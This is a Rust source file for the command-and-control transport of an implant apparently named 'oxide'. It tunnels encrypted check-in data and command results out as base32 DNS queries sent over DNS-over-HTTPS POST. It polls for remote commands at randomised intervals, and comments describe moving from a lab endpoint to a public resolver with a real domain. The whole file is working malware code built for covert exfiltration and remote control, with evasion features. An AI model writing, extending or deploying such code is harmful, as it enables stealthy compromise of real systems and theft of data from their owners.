//! DoH C2 transport — RFC 8484. Same fragment encoding as dns.rs, carrier = HTTPS POST.
//! Lab: panel's /dns-query endpoint (TLS-pinned, same cert).
//! Production: public DoH resolver + real domain + NS delegation.

use anyhow::{Context, Result};
use data_encoding::BASE32_NOPAD;
use flate2::{write::GzEncoder, Compression};
use rand::RngCore;
use rand_distr::{Distribution, Gamma};
use std::io::Write;
use std::sync::Arc;
use std::time::Duration;

use crate::checkin;
use crate::config::Config;
use crate::dispatcher::Dispatcher;
use crate::dns_wire;
use crate::persistence::PersistenceChain;
use crate::transport::tls::PinnedCertVerifier;
use oxide_shared::packet::Packet;

const FRAG_BYTES: usize = 34;
const C2_DOMAIN: &str = "oxide.lab";

fn gamma_interval(base: f64) -> f64 {
    Gamma::new(2.0_f64, base / 2.0)
        .unwrap()
        .sample(&mut rand::thread_rng())
        .clamp(60.0, 21600.0)
}

fn build_client(config: &Config) -> Result<reqwest::Client> {
    let verifier = Arc::new(PinnedCertVerifier { expected_hash: config.cert_hash });
    let rustls_cfg =
        rustls::ClientConfig::builder_with_protocol_versions(&[&rustls::version::TLS13])
            .dangerous()
            .with_custom_certificate_verifier(verifier)
            .with_no_client_auth();
    reqwest::Client::builder()
        .use_preconfigured_tls(rustls_cfg)
        .build()
        .context("build DoH client")
}

async fn doh_post(client: &reqwest::Client, url: &str, qname: &str) -> Result<Option<Vec<u8>>> {
    let mut id = [0u8; 2];
    rand::thread_rng().fill_bytes(&mut id);
    let wire = dns_wire::build_txt_query(qname, u16::from_be_bytes(id));
    let resp = client
        .post(url)
        .header("Content-Type", "application/dns-message")
        .header("Accept", "application/dns-message")
        .body(wire)
        .send()
        .await
        .context("DoH POST")?;
    anyhow::ensure!(resp.status().is_success(), "DoH {}", resp.status());
    Ok(dns_wire::parse_txt_rdata(&resp.bytes().await?))
}

async fn upload(
    client: &reqwest::Client,
    url: &str,
    key: &[u8; 32],
    session: &str,
    payload: &[u8],
) -> Result<()> {
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    gz.write_all(payload).unwrap();
    let ct = oxide_shared::encrypt_stateless(key, &gz.finish().unwrap());
    let chunks: Vec<&[u8]> = ct.chunks(FRAG_BYTES).collect();
    let total = chunks.len().min(255) as u8;
    for (i, chunk) in chunks.iter().enumerate() {
        let l1 = format!("{}{:02x}{:02x}", &session[..6], total, i as u8);
        let l2 = BASE32_NOPAD.encode(chunk).to_ascii_lowercase();
        doh_post(client, url, &format!("{}.{}.c2.{}", l1, l2, C2_DOMAIN)).await?;
    }
    Ok(())
}

async fn poll(
    client: &reqwest::Client,
    url: &str,
    key: &[u8; 32],
    session: &str,
) -> Result<Option<Packet>> {
    let qn = format!("{}0000.hb.c2.{}", &session[..6], C2_DOMAIN);
    match doh_post(client, url, &qn).await? {
        None => Ok(None),
        Some(txt) => {
            let ct = BASE32_NOPAD
                .decode(&txt.to_ascii_uppercase())
                .context("b32")?;
            let plain = oxide_shared::decrypt_stateless(key, &ct)
                .map_err(|e| anyhow::anyhow!("{:?}", e))?;
            Ok(Some(serde_json::from_slice(&plain)?))
        }
    }
}

pub struct DohTransport;

impl DohTransport {
    pub async fn run(
        config: &Config,
        dispatch: &Dispatcher,
        chain: &PersistenceChain,
    ) -> Result<()> {
        let key = oxide_shared::derive_key(&config.psk, &config.salt);
        let client = build_client(config)?;
        let url = format!("https://{}:{}/dns-query", config.host, config.port);
        let mut sid = [0u8; 3];
        rand::thread_rng().fill_bytes(&mut sid);
        let session = hex::encode(sid);

        let pkt = checkin::build_checkin_packet(&chain.check_all());
        upload(&client, &url, &key, &session, &serde_json::to_vec(&pkt)?).await?;

        loop {
            tokio::time::sleep(Duration::from_secs_f64(gamma_interval(
                config.beacon_base_secs,
            )))
            .await;
            if let Some(cmd) = poll(&client, &url, &key, &session).await? {
                let resp = dispatch.dispatch(&cmd);
                upload(&client, &url, &key, &session, &serde_json::to_vec(&resp)?).await?;
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn doh_wire_packet_valid() {
        let q = dns_wire::build_txt_query("test.oxide.lab", 0x1234);
        assert_eq!(q[0], 0x12);
        assert_eq!(q[1], 0x34);
        assert!(q.len() > 12);
    }

    #[test]
    fn gamma_positive() {
        assert!(gamma_interval(7200.0) > 0.0);
    }
}
